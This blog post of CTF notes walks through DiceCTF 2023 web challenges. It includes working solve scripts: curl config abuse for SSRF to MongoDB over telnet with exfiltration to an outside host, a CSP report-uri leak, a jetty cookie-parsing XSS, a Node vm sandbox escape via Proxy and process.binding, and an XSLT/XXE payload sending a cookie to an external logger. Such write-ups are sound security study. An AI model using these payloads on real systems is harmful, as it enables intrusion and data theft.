---
title: DiceCTF 2023 Notes
catalog: true
date: 2023-03-26 09:10:44
tags: [Security]
categories: [Security]
photos: /img/dicectf-2023-writeup/cover-en.png
---

Although it's been almost two months, I'm still going to take some notes. [Last year](/2022/02/08/what-i-learned-from-dicectf-2022/), I was electrocuted badly. I thought it would be better this year since it's been a year, but I still got electrocuted.

Keywords:

1. SSRF mongoDB via telnet protocol
2. jetty cookie parser
3. ASI (Automatic Semicolon Insertion)
4. VM sandbox escape via Proxy
5. process.binding
6. Browser's XSLT + XXE

First, let me post the official repo, which contains the code and answers: https://github.com/dicegang/dicectf-2023-challenges

<!-- more -->

## Web - codebox (30 solves)

This is the only question that was solved, and it's quite interesting.

The backend is very simple, with a function that adjusts the CSP based on the code parameter, which can achieve CSP injection:

``` js
const fastify = require('fastify')();
const HTMLParser = require('node-html-parser');

const box = require('fs').readFileSync('box.html', 'utf-8');

fastify.get('/', (req, res) => {
    const code = req.query.code;
    const images = [];

    if (code) {
        const parsed = HTMLParser.parse(code);
        for (let img of parsed.getElementsByTagName('img')) {
            let src = img.getAttribute('src');
            if (src) {
                images.push(src);
            }
        }
    }

    const csp = [
        "default-src 'none'",
        "style-src 'unsafe-inline'",
        "script-src 'unsafe-inline'",
    ];

    if (images.length) {
        csp.push(`img-src ${images.join(' ')}`);
    }

    res.header('Content-Security-Policy', csp.join('; '));

    res.type('text/html');
    return res.send(box);
});

fastify.listen({ host: '0.0.0.0', port: 8080 });
```

The frontend looks like this, which puts the code you provide into a sandbox iframe:

``` html
<!DOCTYPE html>
<html lang="en">
<head>
  <title>codebox</title>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <style>
    * {
        margin: 0;
        font-family: monospace;
        line-height: 1.5em;
    }
    
    div {
        margin: auto;
        width: 80%;
        padding: 20px;
    }
    
    textarea {
        width: 100%;
        height: 200px;
        max-width: 500px;
    }

    iframe {
        border: 1px solid lightgray;
    }
  </style>
</head>
<body>
  <div id="content">
    <h1>codebox</h1>
    <p>Codebox lets you test your own HTML in a sandbox!</p>
    <br>
    <form action="/" method="GET">
        <textarea name="code" id="code"></textarea>
        <br><br>
        <button>Create</button>
    </form>
    <br>
    <br>
  </div>
  <div id="flag"></div>
</body>
<script>
    const code = new URL(window.location.href).searchParams.get('code');
    if (code) {
        const frame = document.createElement('iframe');
        frame.srcdoc = code;
        frame.sandbox = '';
        frame.width = '100%';
        document.getElementById('content').appendChild(frame);
        document.getElementById('code').value = code; 
    }

    const flag = localStorage.getItem('flag') ?? "flag{test_flag}";
    document.getElementById('flag').innerHTML = `<h1>${flag}</h1>`;
  </script>
</html>
```

The interesting thing about this question is that at first, you might think it allows you to change the CSP, and you can use the `sandbox` CSP rule to do something, and then you can escape the sandbox, but you will find that it doesn't work.

The correct answer is to use `require-trusted-types-for 'script';` to block `document.getElementById('flag').innerHTML = flag;`, and then use `report-uri https://vps` to report the blocked content, which allows you to get the flag.

There's also another small detail, which is that `frame.sandbox = '';` is also managed by `require-trusted-types-for`, so this part will fail first, so you need to skip this part as well.

The skipping method is simple. If you have multiple parameters, the frontend's `searchParams.get()` will only take the first parameter, while the backend will turn it into an array if there are multiple parameters. Therefore, passing `?code=&code=payload` will make the content seen by the frontend and backend different, and the frontend will think it's empty and skip that part.

## Web - unfinished (14 solves)

The core code of this question is as follows:

``` js
app.post("/api/ping", requiresLogin, (req, res) => {
    let { url } = req.body;
    if (!url || typeof url !== "string") {
        return res.json({ success: false, message: "Invalid URL" });
    }

    try {
        let parsed = new URL(url);
        if (!["http:", "https:"].includes(parsed.protocol)) throw new Error("Invalid URL");
    }
    catch (e) {
        return res.json({ success: false, message: e.message });
    }

    const args = [ url ];
    let { opt, data } = req.body;
    if (opt && data && typeof opt === "string" && typeof data === "string") {
        if (!/^-[A-Za-z]$/.test(opt)) {
            return res.json({ success: false, message: "Invalid option" });
        }

        // if -d option or if GET / POST switch
        if (opt === "-d" || ["GET", "POST"].includes(data)) {
            args.push(opt, data);
        }
    }

    cp.spawn('curl', args, { timeout: 2000, cwd: "/tmp" }).on('close', (code) => {
        // TODO: save result to database
        res.json({ success: true, message: `The site is ${code === 0 ? 'up' : 'down'}` });
    });
});
```

You can pass in a URL and options to execute cURL, and the parameter check can be bypassed using config. First, download the config with `-o` and save it to a file named `GET`, and then use `-K` to use the config, like this:

``` py
import requests
import time

host = 'https://unfinished-27df3c439f8d6dd1.mc.ax'
hook_url = 'https://webhook.site/576f330a-c867-4609-b83f-36bbca32abfe'
config_url = 'https://gist.githubusercontent.com/aszx87410/a0a710f8bcc351958d107924632888c9/raw/54673c647da2ea04e90a1c67c7a40eb7e99320f6/test.txt'

def send_command(url, opt="", data=""):
  if opt == "":
    req_data = {
      "url": url
    }
  else:
    req_data = {
      "url": url,
      "opt": opt,
      "data": data
    }
  resp = requests.post(host + "/api/ping", data=req_data)
  print(resp.status_code)

send_command(hook_url)
time.sleep(5) # need to wait for server restart 

send_command(config_url, "-o", "GET")
time.sleep(5)

send_command(hook_url, "-K", "GET")
time.sleep(5)
```

But this is the easiest part. The hardest part is that the flag is stored in mongoDB, so you need to find a way to SSRF mongoDB using cURL.

Oh, by the way, you can't use gopher because it's disabled.

During the competition, I didn't know how to do it and couldn't solve it. After the competition, I looked at other people's solutions and found that you can use `telnet` to do it (source: https://discord.com/channels/805956008665022475/805962699246534677/1071901986338897982):

``` py
import requests
import time

url = 'https://unfinished-9044.mc.ax'

with open('raw_packet.txt', 'wb') as fout:
    fout.write(b'\x92\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\xdd\x07\x00\x00\x00\x00\x00\x00\x00\x7d\x00\x00\x00\x02\x66\x69\x6e\x64\x00\x05\x00\x00\x00\x66\x6c\x61\x67\x00\x03\x66\x69\x6c\x74\x65\x72\x00\x05\x00\x00\x00\x00\x10\x6c\x69\x6d\x69\x74\x00\x01\x00\x00\x00\x08\x73\x69\x6e\x67\x6c\x65\x42\x61\x74\x63\x68\x00\x01\x10\x62\x61\x74\x63\x68\x53\x69\x7a\x65\x00\x01\x00\x00\x00\x03\x6c\x73\x69\x64\x00\x1e\x00\x00\x00\x05\x69\x64\x00\x10\x00\x00\x00\x04\xce\x2d\x77\x58\x58\xfd\x41\xc2\x98\xf9')

print('upload packet contents')
res = requests.post('%s/api/ping' % url, data = {
    'url': 'http://[...]/raw_packet.txt',
    'opt': '-o',
    'data': 'GET',
})
assert res.status_code == 200

time.sleep(5)

print('upload curl config')
with open('curl.config', 'wb') as fout:
    fout.write(("""
next
url="telnet://mongodb:27017"
upload-file="GET"
output="flag.txt"
no-buffer
""").strip().encode())

res = requests.post('%s/api/ping' % url, data = {
    'url': 'http://[...]/curl.config',
    'opt': '-o',
    'data': 'POST',
})
assert res.status_code == 200

time.sleep(5)

print('download flag')
try:
    res = requests.post('%s/api/ping' % url, data = {
        'url': 'http://google.com/',
        'opt': '-K',
        'data': 'POST',
    })
    assert res.status_code == 200
except:
    pass

time.sleep(10)

print('upload exfil config')
with open('curl.config', 'wb') as fout:
    fout.write(("""
next
url="telnet://[...]:1337"
upload-file="flag.txt"
""").strip().encode())

res = requests.post('%s/api/ping' % url, data = {
    'url': 'http://[...]/curl.config',
    'opt': '-o',
    'data': 'POST',
})
assert res.status_code == 200

time.sleep(5)

print('exfil')
try:
    res = requests.post('%s/api/ping' % url, data = {
        'url': 'http://google.com/',
        'opt': '-K',
        'data': 'POST',
    })
    assert res.status_code == 200
except:
    pass
```

There's also an unexpected solution, which is to download a file with cURL and overwrite the contents in node_modules. This way, when the server restarts, it will load the JS you wrote, and you can easily get the flag.

## Web - jnotes (6 solves)

This question is a Java web:

``` java
package dev.arxenix;

import java.net.URLDecoder;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;

import io.javalin.Javalin;
import io.javalin.http.Context;
import io.javalin.http.Cookie;

public class App {
    public static String DEFAULT_NOTE = "Hello world!\r\nThis is a simple note-taking app.";

    public static String getNote(Context ctx) {
        var note = ctx.cookie("note");
        if (note == null) {
            setNote(ctx, DEFAULT_NOTE);
            return DEFAULT_NOTE;
        }
        return URLDecoder.decode(note, StandardCharsets.UTF_8);
    }

    public static void setNote(Context ctx, String note) {
        note = URLEncoder.encode(note, StandardCharsets.UTF_8);
        ctx.cookie(new Cookie("note", note, "/", -1, false, 0, true));
    }

    public static void main(String[] args) {
        var app = Javalin.create();

        app.get("/", ctx -> {
            var note = getNote(ctx);
            ctx.html("""
                    <html>
                    <head></head>
                    <body>
                    <h1>jnotes</h1>

                    <form method="post" action="create">
                    <textarea rows="20" cols="50" name="note">
                    %s
                    </textarea>
                    <br>
                    <button type="submit">Save notes</button>
                    </form>

                    <hr style="margin-top: 10em">
                    <footer>
                    <i>see something unusual on our site? report it <a href="https://adminbot.mc.ax/web-jnotes">here</a></i>
                    </footer>
                    </body>
                    </html>""".formatted(note));
        });

        app.post("/create", ctx -> {
            var note = ctx.formParam("note");
            setNote(ctx, note);
            ctx.redirect("/");
        });
        
        app.start(1337);
    }
}
```

Although you have a free XSS, the cookie is httponly, so you can't read it.

The solution is to use jetty's strange cookie parsing behavior. If the content of the cookie contains `"`, it will read until the next `"`. 

For example, if there are three cookies:

1. note="a
2. flag=dice{flag}
3. end=b"

The header sent is: `note="a; flag=dice{flag}; end=b"`, which will be parsed as a single `note` cookie instead of the expected three cookies.

So the key is to create these cookies and then make the browser send them in the order we want.

Chrome sends cookies in the order of longest path first, followed by most recently updated, so all we need to do is:

``` js
document.cookie = `note="a; path=//`; // use double slash path to get it to appear at start (longest path)
document.cookie = `end=ok;"`; // last cookie (most recently updated)
w = window.open('https://jnotes.mc.ax//')
```

to make the flag reflect on the page and obtain the flag.

## Web - gift (4 solves)

I didn't look at this question carefully, and I still haven't studied it after the competition. I only know that there is a part related to ASI (Automatic Semicolon Insertion), where it looks like A, but the actual result is B, due to the mechanism of JS inserting semicolons.

There have been similar questions before, which are quite interesting, but it is indeed difficult to see with the naked eye. It seems that I need to practice more.

## Web - jwtjail (3 solves)

I really regret this question. I have looked for everything I should have looked for, and I have also looked at the original code of the lib several times, but I still couldn't solve it, and I was so close.

The code looks like this:

``` js
const jwt = require("jsonwebtoken");
const express = require("express");
const vm = require("vm");

const app = express();

const PORT = process.env.PORT || 12345;

app.use(express.urlencoded({ extended: false }));

const ctx = { codeGeneration: { strings: false, wasm: false }};
const unserialize = (data) => new vm.Script(`"use strict"; (${data})`).runInContext(vm.createContext(Object.create(null), ctx), { timeout: 250 });

process.mainModule = null; // 🙃

app.use(express.static("public"));

app.post("/api/verify", (req, res) => {
    let { token, secretOrPrivateKey } = req.body;
    try {
        token = unserialize(token);
        secretOrPrivateKey = unserialize(secretOrPrivateKey);
        res.json({
            success: true,
            data: jwt.verify(token, secretOrPrivateKey)
        });
    }
    catch {
        res.json({
            success: false,
            data: "Verification failed"
        });
    }
});

app.listen(PORT, () => console.log(`web/jwtjail listening on port ${PORT}`));
```

By using vm to put the data you throw into another context, and then calling the jwt lib, the goal is to find a place where you can escape during the processing of the jwt lib.

The solution is that we can add a proxy to a function. If the function is called, it will first call the apply of the proxy.

``` js
var p = new Proxy(_ => _, {
  apply(target, thisArg, argumentsList) {
    console.log('apply')
  }
})
p() // apply
```

And the third parameter `argumentsList` of this apply comes from an object from the outside world, so we can escape from the VM by relying on this parameter.

In addition, although `process.mainModule` has been deleted, you can use `process.binding("spawn_sync")` to execute the code.

A simple PoC looks like this:

``` js
"use strict";
const vm = require("vm");

const ctx = { codeGeneration: { strings: false, wasm: false }};
const unserialize = (data) => new vm.Script(`"use strict"; (${data})`)
    .runInContext(
        vm.createContext(Object.create({console}), ctx),
        { timeout: 250 }
    );

var data = `{
    key: {
        toString: new Proxy(_ => _, {
            apply(a, b, c) {
                console.log(c.constructor.constructor("return this")().process.pid)
            }
        })
    }
}`

try {
    data = unserialize(data);
    console.log(data['key'].toString())
} catch(err) {
    console.log(err)
}
```

In the Discord discussion after the competition, someone also mentioned that it is possible to use double proxies to achieve "escape as long as you access the value of the object", like this:

``` js
"use strict";
const vm = require("vm");

const ctx = { codeGeneration: { strings: false, wasm: false }};
const unserialize = (data) => new vm.Script(`"use strict"; (${data})`)
    .runInContext(
        vm.createContext(Object.create({console}), ctx),
        { timeout: 250 }
    );

var data = `new Proxy({}, {
    get: new Proxy(_=>_, {
        apply(a,b,c) {
            console.log(c.constructor.constructor("return this")().process.pid)
        }
    })
})`

try {
    data = unserialize(data);
    data['key'];
} catch(err) {
    console.log(err)
}
```

Author's writeup: https://brycec.me/posts/dicectf_2023_challenges

## Web - impossible XSS (0 solves)

This question is very cool, and the code is very simple:

``` js
const express = require('express');
const cookieParser = require('cookie-parser');
const app = express();
app.use(cookieParser());

app.get('/', (req, res) => {
    // free xss, how hard could it be?
    res.end(req.query?.xss ?? 'welcome to impossible-xss');
});

app.get('/flag', (req, res) => {
    // flag in admin bot's FLAG cookie
    res.end(req.cookies?.FLAG ?? 'dice{fakeflag}');
});

app.listen(8080);
```

You have a free xss, but there is a line `await page.setJavaScriptEnabled(false);` in the admin bot, which turns off JS directly.

The solution is to use XSLT with XXE, like this:

``` js
ss = `<?xml version="1.0"?>
<!DOCTYPE a [
   <!ENTITY xxe SYSTEM  "https://impossible-xss.mc.ax/flag" >]>
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="1.0">
  <xsl:template match="/asdf">
    <HTML>
      <HEAD>
        <TITLE></TITLE>
      </HEAD>
      <BODY>
        <img>
          <xsl:attribute name="src">
            https://hc.lc/log2.php?&xxe;
          </xsl:attribute>
        </img>
      </BODY>
    </HTML>
  </xsl:template>
</xsl:stylesheet>`

xml=`<?xml version="1.0"?>
<?xml-stylesheet type="text/xsl" href="data:text/plain;base64,${btoa(ss)}"?>
<asdf></asdf>`
payload=encodeURIComponent(xml)
```

Author's writeup: https://blog.ankursundara.com/dicectf23-writeups/
